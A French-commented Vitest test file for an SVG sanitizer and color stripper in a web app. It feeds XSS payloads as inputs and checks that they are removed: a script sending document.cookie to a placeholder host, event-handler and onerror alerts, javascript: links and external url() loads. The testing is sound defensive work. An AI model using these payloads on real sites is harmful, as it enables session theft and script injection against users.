/**
 * Ces tests sont la barriere de securite, pas une formalite.
 *
 * Le contenu assaini ici finit dans `dangerouslySetInnerHTML`, en base, et
 * servi a l'autre membre du foyer. Chaque cas ci-dessous correspond a un
 * vecteur reel : execution de script, gestionnaire d'evenement, navigation,
 * requete sortante, evasion hors du SVG.
 *
 * Regle de lecture : on n'affirme pas seulement que la charge utile disparait,
 * on affirme aussi que ce qui reste ne la contient plus SOUS AUCUNE FORME —
 * d'ou les assertions sur la chaine complete et pas seulement sur la balise.
 */

import { describe, expect, it } from 'vitest'

import { sanitizeSvg, stripColors } from './svg.js'

const clean = (svg: string) => sanitizeSvg(svg).markup

describe('sanitizeSvg — ce qui doit passer', () => {
  it('garde un dessin au trait ordinaire', () => {
    const { markup, viewBox } = sanitizeSvg(
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 4h16v16H4Z"/></svg>',
    )
    expect(markup).toBe('<path d="M4 4h16v16H4Z"/>')
    expect(viewBox).toBe('0 0 24 24')
  })

  it('conserve la grille d’origine quand elle differe de la notre', () => {
    expect(sanitizeSvg('<svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="200"/></svg>').viewBox).toBe(
      '0 0 512 512',
    )
  })

  it('retombe sur la grille maison quand le viewBox est absent ou aberrant', () => {
    expect(sanitizeSvg('<svg><path d="M0 0"/></svg>').viewBox).toBe('0 0 24 24')
    expect(sanitizeSvg('<svg viewBox="alert(1)"><path d="M0 0"/></svg>').viewBox).toBe('0 0 24 24')
  })

  it('accepte les formes et les groupes, avec leurs attributs geometriques', () => {
    const svg =
      '<svg viewBox="0 0 24 24"><g transform="translate(2 2)"><rect x="1" y="1" width="4" height="4" rx="1"/>' +
      '<polyline points="0,0 4,4"/><line x1="0" y1="0" x2="4" y2="4"/><ellipse cx="2" cy="2" rx="1" ry="2"/></g></svg>'
    const out = clean(svg)
    expect(out).toContain('<g transform="translate(2 2)">')
    expect(out).toContain('</g>')
    expect(out).toContain('<rect x="1" y="1" width="4" height="4" rx="1"/>')
    expect(out).toContain('<polyline points="0,0 4,4"/>')
  })

  it('n’emporte pas la racine : c’est <Icon> qui la pose', () => {
    expect(clean('<svg viewBox="0 0 24 24"><path d="M0 0"/></svg>')).not.toContain('<svg')
  })
})

describe('sanitizeSvg — ce qui doit tomber', () => {
  it('supprime <script> ET son contenu', () => {
    const out = clean('<svg><script>fetch("//x.tld?c="+document.cookie)</script><path d="M0 0"/></svg>')
    expect(out).toBe('<path d="M0 0"/>')
    expect(out).not.toContain('fetch')
    expect(out).not.toContain('document.cookie')
  })

  it('supprime les gestionnaires d’evenement, sur n’importe quelle balise', () => {
    for (const attr of ['onload', 'onclick', 'onmouseover', 'onbegin', 'onfocusin']) {
      const out = clean(`<svg><path d="M0 0" ${attr}="alert(1)"/></svg>`)
      expect(out, attr).toBe('<path d="M0 0"/>')
      expect(out, attr).not.toContain('alert')
    }
  })

  it('supprime foreignObject, qui rouvrirait tout le HTML', () => {
    const out = clean(
      '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject><path d="M0 0"/></svg>',
    )
    expect(out).toBe('<path d="M0 0"/>')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('img')
  })

  it('supprime ce qui joint le reseau', () => {
    expect(clean('<svg><image href="https://x.tld/pixel.png"/><path d="M0 0"/></svg>')).toBe('<path d="M0 0"/>')
    expect(clean('<svg><use href="https://x.tld/s.svg#i"/><path d="M0 0"/></svg>')).toBe('<path d="M0 0"/>')
  })

  it('supprime les animations, qui savent porter du script', () => {
    const out = clean('<svg><animate attributeName="href" values="javascript:alert(1)"/><path d="M0 0"/></svg>')
    expect(out).toBe('<path d="M0 0"/>')
    expect(out).not.toContain('javascript')
  })

  it('supprime <a>, qui rendrait l’icone navigable', () => {
    expect(clean('<svg><a href="javascript:alert(1)"><path d="M0 0"/></a></svg>')).not.toContain('javascript')
  })

  it('supprime style, qui accepte url() donc une requete sortante', () => {
    const out = clean('<svg><path d="M0 0" style="background:url(//x.tld/t)"/></svg>')
    expect(out).toBe('<path d="M0 0"/>')
    expect(out).not.toContain('url(')
  })

  it('supprime class, qui accrocherait la feuille de style de l’application', () => {
    expect(clean('<svg><path d="M0 0" class="app-header"/></svg>')).toBe('<path d="M0 0"/>')
  })

  it('refuse une valeur hostile meme sur un attribut autorise', () => {
    // Seconde barriere : aucun attribut de la liste blanche n'est navigable,
    // mais un elargissement futur ne doit pas rouvrir la porte en silence.
    const out = clean('<svg><path d="javascript:alert(1)" fill="url(//x.tld/t)"/></svg>')
    expect(out).not.toContain('javascript')
    expect(out).not.toContain('url(')
  })

  it('ne se laisse pas berner par la casse ni les espaces', () => {
    const out = clean('<svg>< SCRIPT >alert(1)</ SCRIPT ><PATH D="M0 0" OnLoad="alert(2)"/></svg>')
    expect(out).not.toContain('alert')
    expect(out.toLowerCase()).toContain('<path d="m0 0"')
  })

  it('neutralise un commentaire qui masquerait la suite', () => {
    const out = clean('<svg><!-- <path d="ok"/> --><script>alert(1)</script><path d="M1 1"/></svg>')
    expect(out).toBe('<path d="M1 1"/>')
  })

  it('ne laisse pas une balise interdite autofermante avaler le dessin', () => {
    // `<script/>` n'ouvre rien : compter une profondeur ferait disparaitre
    // tout ce qui suit, et l'utilisateur verrait une icone vide sans savoir
    // pourquoi.
    expect(clean('<svg><script/><path d="M0 0"/></svg>')).toBe('<path d="M0 0"/>')
  })

  it('rend une chaine vide plutot qu’un fragment quand rien ne survit', () => {
    expect(clean('<svg><script>alert(1)</script></svg>')).toBe('')
  })
})

describe('sanitizeSvg — ce qu’on rapporte', () => {
  it('nomme ce qui a ete retire, au lieu de le taire', () => {
    const { removed } = sanitizeSvg('<svg><script>x</script><path d="M0 0" onclick="x"/></svg>')
    expect(removed).toContain('<script>')
    expect(removed.some((r) => r.includes('onclick'))).toBe(true)
  })

  it('signale l’absence de balise svg', () => {
    expect(sanitizeSvg('<path d="M0 0"/>').removed).toContain('balise <svg> absente')
  })
})

describe('stripColors', () => {
  it('retire couleurs et opacites pour laisser passer la teinte du rayon', () => {
    expect(stripColors('<path d="M0 0" fill="#ff0000" stroke="blue" fill-opacity="0.5"/>')).toBe(
      '<path d="M0 0"/>',
    )
  })

  it('garde fill="none", qui est une consigne de trace et non une couleur', () => {
    // L'oter remplirait tous les contours fermes : un cercle deviendrait un disque.
    expect(stripColors('<circle cx="1" cy="1" r="1" fill="none"/>')).toBe(
      '<circle cx="1" cy="1" r="1" fill="none"/>',
    )
  })
})
